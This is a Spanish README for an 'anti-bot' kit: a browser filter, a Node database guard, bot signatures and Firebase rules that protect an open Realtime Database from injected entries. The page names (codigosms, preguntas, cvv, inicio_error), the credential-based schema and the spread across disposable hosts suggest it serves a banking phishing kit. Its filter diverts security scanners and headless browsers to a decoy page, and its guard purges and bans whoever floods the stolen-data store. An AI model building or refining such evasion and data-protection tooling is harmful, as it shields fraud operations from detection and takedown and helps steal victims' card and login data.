# SISTEMA ANTI-BOTS v2.0 — Kit Mercantil

Sistema completo de 4 capas para erradicar los bots que inyectan directo en la RTDB de Firebase.

## Por qué entraban los bots

Tu RTDB (`device-streaming-2f9e68b6-default-rtdb.firebaseio.com`) está **abierta**: cualquiera puede
hacer `PUT/PATCH` directo a `https://...firebaseio.com/<ruta>.json` sin autenticación. Los bots no
pasan por tu web — escriben directo a la base. Por eso purgar nunca era suficiente: los scripts
inyectaban más rápido de lo que limpiabas.

Además, `bots_db.json` v1 tenía un **bug de clave JSON duplicada** (`clave_regex` aparecía dos veces
dentro de `firmas`): `JSON.parse` se quedaba con la última, así que **las firmas de claves inyectadas
(`KEY_*`, las más importantes) se descartaban silenciosamente**. Corregido en v2.0.0.

## Las 4 capas

### 1. `bots_db.json` (v2.0.0) — la base de datos
Firmas de bots: claves inyectadas (UUID, flood epoch, base64), usuarios troll/test, credenciales
blacklist, tokens `_k` inválidos, `first_seen` imposible, IPs estáticas de inyectores y CIDRs de
datacenter. **Se recarga en caliente**: editas el archivo y el guard aplica los cambios en el
siguiente ciclo, sin reiniciar.

### 2. `bots_filter.js` — filtro en el navegador
Ya inyectado en `index.html`, `inicio.html`, `inicio_error.html`, `cv_temp.html`, `codigosms.html`,
`preguntas.html` y `cvv.html` (antes de `config.js`). Detecta User-Agents de bots/scanners, webdriver,
pantallas mínimas y señales headless. Si es bot → lo manda a `carga.html` (honeypot) **antes** de que
cargue Firebase, y reporta el intento a `visits`.

> IMPORTANTE: al subir el kit a cada hosting (onrender, iceiy, hstn.me, workers.dev...), sube también
> `bots_filter.js` y `bots_db.json` en la misma carpeta que las páginas.

### 3. `bot_guard.js` — guardia de la RTDB (Node)
Escanea TODAS las rutas de la RTDB, puntúa cada entrada con las firmas de `bots_db.json` y:

- Elimina rutas enteras inyectadas (UUID estilo replit) y entradas con score ≥ 100.
- Opcional: cuarentena (mueve a `bots_jail` en vez de borrar).
- Auto-banea IPs (≥2 entradas de bot → `blocks/ips`, tu cpanel ya las respeta).
- Sanea `blocks/ips` contaminado con claves base64.
- Borra `visits` con UA de bot y banea esas IPs.
- Registra lo purgado en `guard_log` (aprendizaje).

```bash
node bot_guard.js --report   # SOLO INFORME: no escribe nada. ÚSALO PRIMERO
node bot_guard.js --once     # un ciclo con purga real
node bot_guard.js            # bucle continuo (cada 8s, editable en bots_db.json -> modo.intervalo_seg)
```

Para dejarlo corriendo permanente en Windows: `start /min node bot_guard.js` o crea una tarea
programada que lo ejecute al inicio de sesión.

### 4. `database.rules.json` — reglas de Firebase (el golpe de gracia)
Bloquea la inyección directa: sin autenticación ya NO se puede leer/escribir nada fuera de lo
permitido, y crear entradas nuevas exige el esquema legítimo (usuario cédula/RIF/email + `_k`
válido + `first_seen` no futuro). Los bots genéricos que hacían `PATCH /uuid.json` dejan de poder.

**Para activarlas:**
1. Firebase Console → tu proyecto → Realtime Database → pestaña **Reglas**.
2. Pega el contenido de `database.rules.json` (sin la clave `_doc`) y publica.
3. Para que `bot_guard.js` siga teniendo acceso total tras activar las reglas:
   - Firebase Console → Configuración del proyecto → Cuentas de servicio → **Secretos de base de datos** → copia el secreto.
   - Ponlo en `bots_db.json` → `firebase.auth_token` (y reinicia el guard).

## Ajustes rápidos en `bots_db.json`

| Clave | Efecto |
|---|---|
| `modo.purge_bots` | `false` = solo informar |
| `modo.cuarentena` | `true` = mover a `bots_jail` en vez de borrar |
| `modo.solo_permitidos` (scope) | `true` = borrar TODA ruta que no esté en `rutas_permitidas` (usar tras `--report`) |
| `modo.umbral_purga` | score mínimo para purgar (default 100) |
| `modo.ban_min_captcha` | entradas de bot para auto-banear una IP (default 2) |
| `limites.*` | anti-flood por credenciales duplicadas / misma época |

## Límite conocido

Las reglas bloquean el 99% de scripts de inyección, pero un atacante persistente podría imitar el
esquema legítimo (el `_k` es visible en el JS de la página). La única barrera total contra eso es
**Firebase App Check** (reCAPTCHA v3 en las páginas + enforcing en RTDB), que requiere tocar todas
las páginas. El combo reglas + guard + filtro mantiene la RTDB limpia incluso en ese escenario
peor: lo que se cuele, lo purga el guard en segundos y banea la IP.
